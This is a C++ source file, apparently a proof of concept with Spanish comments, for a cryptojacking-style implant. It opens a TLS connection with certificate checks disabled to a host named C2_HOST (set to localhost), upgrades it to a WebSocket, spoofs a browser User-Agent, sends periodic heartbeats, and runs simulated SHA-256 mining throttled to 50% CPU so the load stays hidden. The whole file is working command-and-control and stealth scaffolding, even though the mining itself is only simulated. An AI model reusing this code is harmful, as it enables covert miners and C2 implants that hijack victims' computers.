#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <cstring>
#include <random>
#include <sstream>
#include <iomanip>

#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/sha.h>

// Configuración
#define C2_HOST "127.0.0.1"
#define C2_PORT 8443
#define TARGET_CPU_USAGE 0.5 // 50%
#define WORK_SLICE_MS 50     // 50ms trabajo
#define HEARTBEAT_INTERVAL_SEC 10

// Globales para SSL
SSL_CTX *ctx;
SSL *ssl;
int sock;

// Utilidades
void cleanup() {
    if (ssl) SSL_free(ssl);
    if (ctx) SSL_CTX_free(ctx);
    if (sock > 0) close(sock);
}

std::string base64_encode(const unsigned char* buffer, size_t length) {
    static const char* b64_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string ret;
    ret.reserve((length + 2) / 3 * 4);
    int val = 0, valb = -6;
    for (size_t i = 0; i < length; ++i) {
        val = (val << 8) + buffer[i];
        valb += 8;
        while (valb >= 0) {
            ret.push_back(b64_table[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) ret.push_back(b64_table[((val << 8) >> (valb + 8)) & 0x3F]);
    while (ret.size() % 4) ret.push_back('=');
    return ret;
}

std::string generate_ws_key() {
    unsigned char buf[16];
    std::random_device rd;
    for(int i=0; i<16; i++) buf[i] = rd() % 256;
    return base64_encode(buf, 16);
}

// WebSocket Frame Generator (Client -> Server masked)
std::vector<uint8_t> create_ws_frame(const std::string& msg) {
    std::vector<uint8_t> frame;
    frame.push_back(0x81); // FIN + Text

    size_t len = msg.length();
    if (len <= 125) {
        frame.push_back(len | 0x80); // Mask bit set
    } else if (len <= 65535) {
        frame.push_back(126 | 0x80);
        frame.push_back((len >> 8) & 0xFF);
        frame.push_back(len & 0xFF);
    } else {
        // No implementado para mensajes gigantes en este POC
        return frame;
    }

    // Generar máscara
    std::random_device rd;
    uint8_t mask[4];
    for(int i=0; i<4; i++) {
        mask[i] = rd() % 256;
        frame.push_back(mask[i]);
    }

    // Enmascarar payload
    for(size_t i=0; i<len; i++) {
        frame.push_back(msg[i] ^ mask[i % 4]);
    }

    return frame;
}

bool connect_c2() {
    // Inicializar OpenSSL
    SSL_library_init();
    SSL_load_error_strings();
    const SSL_METHOD *method = TLS_client_method();
    ctx = SSL_CTX_new(method);

    // Socket TCP
    sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_HOST, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        return false;
    }

    // Handshake SSL (Sin verificar cert para simulación self-signed)
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    SSL_set_verify(ssl, SSL_VERIFY_NONE, NULL);

    if (SSL_connect(ssl) <= 0) {
        return false;
    }

    // Handshake HTTP Upgrade
    std::string key = generate_ws_key();
    std::string handshake =
        "GET / HTTP/1.1\r\n"
        "Host: " C2_HOST "\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: " + key + "\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n"
        "\r\n";

    SSL_write(ssl, handshake.c_str(), handshake.length());

    char buf[1024];
    int bytes = SSL_read(ssl, buf, sizeof(buf)-1);
    if (bytes > 0) {
        buf[bytes] = 0;
        if (strstr(buf, "101 Switching Protocols")) {
            return true;
        }
    }
    return false;
}

void compute_burst() {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    std::string data = "simulated_mining_block_data_randomness";
    SHA256_CTX sha256;

    // Simular trabajo pesado
    auto start = std::chrono::high_resolution_clock::now();
    while (true) {
        SHA256_Init(&sha256);
        SHA256_Update(&sha256, data.c_str(), data.size());
        SHA256_Final(hash, &sha256);
        data[0]++; // Mutar datos

        auto now = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(now - start).count();
        if (duration >= WORK_SLICE_MS) break;
    }
}

int main() {
    // Intentar conectar (si falla, reintentar o morir - aqui morimos para el POC)
    if (!connect_c2()) {
        return 1;
    }

    // Establecer socket no bloqueante para el loop
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    auto last_heartbeat = std::chrono::steady_clock::now();

    while (true) {
        // 1. Enviar Heartbeat si es necesario
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(now - last_heartbeat).count() >= HEARTBEAT_INTERVAL_SEC) {
            std::vector<uint8_t> frame = create_ws_frame("HEARTBEAT");
            SSL_write(ssl, frame.data(), frame.size());
            last_heartbeat = now;
        }

        // 2. Leer del socket (drenar buffer)
        char buf[1024];
        int r = SSL_read(ssl, buf, sizeof(buf));
        // Ignoramos respuesta por ahora, solo mantenemos viva la conexión

        // 3. Trabajar (50ms)
        compute_burst();

        // 4. Dormir (50ms) -> 50% CPU load
        std::this_thread::sleep_for(std::chrono::milliseconds(WORK_SLICE_MS));
    }

    cleanup();
    return 0;
}
